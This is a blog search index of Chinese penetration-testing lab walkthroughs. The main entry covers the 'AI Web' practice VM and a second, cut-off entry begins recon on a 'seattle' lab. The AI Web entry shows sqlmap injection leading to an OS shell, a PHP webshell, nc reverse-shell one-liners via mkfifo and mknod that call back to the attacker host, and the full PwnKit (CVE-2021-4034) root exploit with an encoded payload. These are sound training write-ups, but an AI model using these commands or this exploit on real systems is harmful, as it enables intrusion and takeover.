<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/10/07/AI%20Web%EF%BC%9A/"/>
    <url>/2023/10/07/AI%20Web%EF%BC%9A/</url>
    
    <content type="html"><![CDATA[<h1 id="AI-Web："><a href="#AI-Web：" class="headerlink" title="AI Web："></a>AI Web：</h1><h2 id="一、环境搭建："><a href="#一、环境搭建：" class="headerlink" title="一、环境搭建："></a>一、环境搭建：</h2><h3 id="1-准备工具："><a href="#1-准备工具：" class="headerlink" title="1.准备工具："></a>1.准备工具：</h3><h4 id="渗透kali："><a href="#渗透kali：" class="headerlink" title="渗透kali："></a>渗透kali：</h4><p>   kali中集成了许多渗透相关的工具，可以通过kali为媒介来进行各种渗透i测试；</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> ip：<span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><h4 id="AI-Web-靶机："><a href="#AI-Web-靶机：" class="headerlink" title="AI Web 靶机："></a>AI Web 靶机：</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">靶机 <span class="hljs-built_in">ip</span>：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">190</span>.<span class="hljs-number">187</span><br></code></pre></td></tr></table></figure><p>两台虚拟机使用nat模式，将其分配到同一网段</p><h2 id="二、渗透过程："><a href="#二、渗透过程：" class="headerlink" title="二、渗透过程："></a>二、渗透过程：</h2><h3 id="1-信息收集："><a href="#1-信息收集：" class="headerlink" title="1.信息收集："></a>1.信息收集：</h3><p>使用nmap扫描同一网段存活主机：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">130</span>是kali，所以<span class="hljs-number">187</span>是目标靶机<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006115854443.png" alt="image-20231006115854443"></p><p>扫描目标靶机的信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">可以看到目标靶机开放了<span class="hljs-number">80</span>端口，同时还有有一个robots.txt文件，以及两个目录<span class="hljs-regexp">/m3diNf0/</span>和<span class="hljs-regexp">/se3reTdir777/u</span>ploads/ ，linux版本在<span class="hljs-number">3</span>到<span class="hljs-number">4</span>左右<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006120318943.png" alt="image-20231006120318943"></p><p>访问80端口，并查看所扫描到的文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在所提供的文件中找到之前扫描到的目录<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006120726398.png" alt="image-20231006120726398"></p><p>尝试访问两个目录，发现无权访问：</p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006120837357.png" alt="image-20231006120837357"></p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006120930957.png" alt="image-20231006120930957"></p><p>扫描目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">分别对<span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span>   http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/m3diNf0/</span> 和 http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/ 三个进行扫描<br></code></pre></td></tr></table></figure><p>只有在扫描：192.168.190.187&#x2F;m3diNf0&#x2F;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">得到一个phpinfo页面：<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006130035464.png" alt="image-20231006130035464"></p><p>在info.php中找到了网站的绝对路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/m3diNf0/i</span>nfo.php    <span class="hljs-regexp">//</span>绝对路径可以对获取shell提供帮助<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006132341401.png" alt="image-20231006132341401"></p><h3 id="2-漏洞利用："><a href="#2-漏洞利用：" class="headerlink" title="2.漏洞利用："></a>2.漏洞利用：</h3><h4 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h4><p>对&#x2F;se3reTdir777&#x2F;uploads&#x2F;目录进行回退时发现：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">在<span class="hljs-regexp">/se3reTdir777/</span>目录中存在搜索框，通过测试发现该提交框存在sql注入<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006121107512.png" alt="image-20231006121107512"></p><p>抓包，可以看到变量参数以及post的提交形式，尝试使用sqlmap进行数据收集：</p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006121323205.png" alt="image-20231006121323205"></p><p>sqlmap的post注入的两种方式：</p><p>（1）：使用-r参数进行注入：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-r参数的使用需要我们将抓包的内容进行保存（保存到一个文件中） 即：<br>sqlmap -r <span class="hljs-string">&quot;D://1.txt&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006123056607.png" alt="image-20231006123056607"></p><p>（2）：使用–data参数进行注入：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--data</span> 只需要我们将所有的post数据复制下来<span class="hljs-params">(抓包所得到的post传入的数据)</span> 即：<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006123357431.png" alt="image-20231006123357431"></p><p>爆得数据：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -tables  <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span><br>在aiweb1的数据库中存在两张表分别是user表和systemUser表，在systemUser表中找到了用户名和base64加密后的密码<br>t00r：       FakeUserPassw0rd                <span class="hljs-string">//base64</span>解密后提示假的用户密码 <br>aiweb1pwn：  MyEvilPass_f908sdaf9_sadfasf0sa <br>u3er：       N0tThis0neA<span class="hljs-keyword">ls</span>0 <br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006124541767.png" alt="image-20231006124541767"></p><p>找不到其他有用的东西，尝试sqlmap获取shell：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap 使用</span> <span class="hljs-literal">--</span><span class="hljs-comment">os</span><span class="hljs-literal">-</span><span class="hljs-comment">shell的前置条件（普通注入</span><span class="hljs-literal">--</span><span class="hljs-comment">os</span><span class="hljs-literal">-</span><span class="hljs-comment">shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行）：</span><br></code></pre></td></tr></table></figure><p>①：是否存在注入点</p><p>②：在使用 –os-shell 获取操作系统 shell 的时候，要先确定当前用户是否为管理员权限（主要是为了对靶机的目录或文件进行读写操作）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/index.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--is-dba</span> <span class="hljs-params">--current-user</span> <br><span class="hljs-string">//</span>可以看到当前的用户为aiweb1user@localhost，且不是DBA，正常情况下是无法继续往下进行的，但存在一个<span class="hljs-string">/se3reTdir777/uploads</span>目录，该目录的功能大概是文件上传，可以通过该目录的绝对路径，来上传文件执行<span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006144306465.png" alt="image-20231006144306465"></p><p>接下来尝试使用–os-shell来进行shell：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/index.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>  <span class="hljs-params">--os-shell</span><br><span class="hljs-string">//</span>选择默认的PHP语言<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006145223034.png" alt="image-20231006145223034"></p><p>选择可以进行写的目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/   <br><span class="hljs-regexp">//</span>尝试使用其他的绝对路径不行，只有uploads可以，可能是因为当前的用户权限不够<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006145800421.png" alt="image-20231006145800421"></p><p>可以看到执行后以及获取到了shell：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">此时的<span class="hljs-keyword">shell</span><span class="language-bash">权限极低，想办法提权，在提权之前，需要建立一个交互式界面，方便一些命令的执行</span><br>nc -e 是不能直接使用的，目前最简单的方法：知道绝对路径，可以上传/写入文件进行蚁剑连接<br>或者上传反弹<span class="hljs-keyword">shell</span><span class="language-bash">脚本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006145941110.png" alt="image-20231006145941110"></p><h3 id="3-权限提升："><a href="#3-权限提升：" class="headerlink" title="3.权限提升："></a>3.权限提升：</h3><h4 id="直接写入php文件："><a href="#直接写入php文件：" class="headerlink" title="直接写入php文件："></a>直接写入php文件：</h4><p>通过sqlmap直接写入文件进行：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> <span class="hljs-number">1</span>.php --<span class="hljs-keyword">file</span>-dest <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php    <br>                               <span class="hljs-comment">//1.php是一句话脚本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006174847744.png" alt="image-20231006174847744"></p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006174828255.png" alt="image-20231006174828255"></p><p>接下来通过蚁剑进行连接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url为：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br>虽然绝对路径为：<span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br>但是我们访问时依旧时为http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231006175529977.png" alt="image-20231006175529977"></p><h4 id="wget下载php文件："><a href="#wget下载php文件：" class="headerlink" title="wget下载php文件："></a>wget下载php文件：</h4><p>在kali上开启www服务，在靶机上下载kali上的php反弹脚本：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">kali自带的有<span class="hljs-keyword">shell</span><span class="language-bash">脚本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007120531029.png" alt="image-20231007120531029"></p><p>靶机通过wget命令下载：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span>/shell.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007120859448.png" alt="image-20231007120859448"></p><p>接下来可以在我们的虚拟终端上进行反弹shell，开启友好的终端交互界面，同时方便一些命令的实施：</p><p>首先在kali机中开启监听：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">监听6666端口<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007090530494.png" alt="image-20231007090530494"></p><p>由于无法使用nc中 -e参数，所以尝试使用其他命令进行反弹shell：</p><h4 id="通过创建管道来将nc反弹命令成功执行："><a href="#通过创建管道来将nc反弹命令成功执行：" class="headerlink" title="通过创建管道来将nc反弹命令成功执行："></a>通过创建管道来将nc反弹命令成功执行：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>z;mkfifo<span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span> <span class="hljs-number">6666</span> &gt; <span class="hljs-regexp">/tmp/</span>z<br><br><span class="hljs-regexp">/tmp/</span>z 必须是不存在的文件 通过mkfifo建立先进先出的管道，cat命令将管道里面的内容输出传递给<span class="hljs-regexp">/bin/</span>sh，sh会执行管道里的命令并将标准输入和标准错误输出结果通过nc传到该管道，由此形成一个回路<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mknod backpipe p; nc <span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span> <span class="hljs-number">6666</span> <span class="hljs-number">0</span>&lt;backpipe | <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">1</span>&gt;backpipe <span class="hljs-number">2</span>&gt;backpipe<br>通过mknod建立FIFO管道backpipe ，用来nc和<span class="hljs-regexp">/bin/</span>bash之间传输数据 <br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007090559155.png" alt="image-20231007090559155"></p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007102207669.png" alt="image-20231007102207669"></p><p>find命令查看可以用来的提权有哪些：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>    <span class="hljs-comment">//发现存在polkit程序</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007102611093.png" alt="image-20231007102611093"></p><h4 id="polkit提权（提权方法不唯一）："><a href="#polkit提权（提权方法不唯一）：" class="headerlink" title="polkit提权（提权方法不唯一）："></a>polkit提权（提权方法不唯一）：</h4><p>polkit影响的版本有：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu14</span>.<span class="hljs-number">04</span>----<span class="hljs-number">20</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007102934074.png" alt="image-20231007102934074"></p><p>上传polkit.py脚本文件到靶机的&#x2F;tmp目录：</p><p>通过nc命令来传输文件：</p><p>接收机靶机：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvnp <span class="hljs-number">4444</span> &gt; polkit.py         <span class="hljs-regexp">//</span>开启监听端口， &gt; 后跟的是接收到文件放到生成的文件（polkit.py）中<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007103455833.png" alt="image-20231007103455833"></p><p>发送机kali：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.190.187</span> <span class="hljs-number">4444</span> &lt; polkit.py<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007103503312.png" alt="image-20231007103503312"></p><p>对提权脚本进行权限赋予：</p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007103609334.png" alt="image-20231007103609334"></p><p>执行脚本即可提权到root：</p><p><img src="/2023/10/07/AI%20Web%EF%BC%9A/image-20231007103659416.png" alt="image-20231007103659416"></p><p>提权脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys</span><br><span class="hljs-comment"># hardcoded amd64 lib</span><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes.util <span class="hljs-keyword">import</span> find_library<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> tempfile<br><br>payload = zlib.decompress(<br>    base64.b64decode(<br>        <span class="hljs-string">&quot;&quot;&quot;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&quot;&quot;&quot;</span><br>    )<br>)<br>libc = CDLL(find_library(<span class="hljs-string">&quot;c&quot;</span>))<br>libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)<br>libc.execve.restype = c_ssize_t<br><br>wd = tempfile.mkdtemp()<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(payload)<br>os.mkdir(wd + <span class="hljs-string">&quot;/gconv/&quot;</span>)<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/gconv/gconv-modules&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(<br>    <span class="hljs-string">&quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;</span><br>)<br>os.mkdir(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>)<br>os.mknod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chdir(wd)<br>cmd = <span class="hljs-string">b&quot;/usr/bin/pkexec&quot;</span><br>argv = []<br>envp = [<br>    <span class="hljs-string">b&quot;gconv&quot;</span>,<br>    <span class="hljs-string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<br>    <span class="hljs-string">b&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,<br>    <span class="hljs-string">b&quot;XAUTHORITY=../gconv&quot;</span>,<br>    <span class="hljs-string">b&quot;&quot;</span>,<br>]<br><br>cargv = (c_char_p * (<span class="hljs-built_in">len</span>(argv) + <span class="hljs-number">1</span>))(*argv, <span class="hljs-literal">None</span>)<br>cenv = (c_char_p * (<span class="hljs-built_in">len</span>(envp) + <span class="hljs-number">1</span>))(*envp, <span class="hljs-literal">None</span>)<br>libc.execve(cmd, cargv, cenv)<br><br></code></pre></td></tr></table></figure><h3 id="4-打靶总结："><a href="#4-打靶总结：" class="headerlink" title="4.打靶总结："></a>4.打靶总结：</h3><p>①：常规的信息收集，通过目录扫描获取后续的信息</p><p>②：存在注入点使该网站存在危险，同时phpinfo页面暴露出网站的绝对路径导致–os-shell的成功建立（关掉phpinfo页面后会降低大量风险）</p><p>③：通过创建管道命令来建立nc的远程连接，间接避开了nc -e不能直接使用</p><p>④：提权方法多样化，说明存在多个漏洞</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>seattle</title>
    <link href="/2023/09/19/seattle/"/>
    <url>/2023/09/19/seattle/</url>
    
    <content type="html"><![CDATA[<h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">攻击机： kali <span class="hljs-number">192.168.190.130</span>  靶机：seattle<br></code></pre></td></tr></table></figure><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>在kali中使用nmap攻击扫描同一网段的存活主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span><br>//得到了目标靶机为<span class="hljs-number">192.168.190.179</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230919081849951.png" alt="image-20230919081849951"></p><p>使用nmap扫描目标主机开放的端口有哪些：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">190.179</span><br><span class="hljs-regexp">//</span>只扫描了目标靶机开放了<span class="hljs-number">80</span>端口，在此端口上运行着HTTP服务，web服务器被识别为Apache httpd的<span 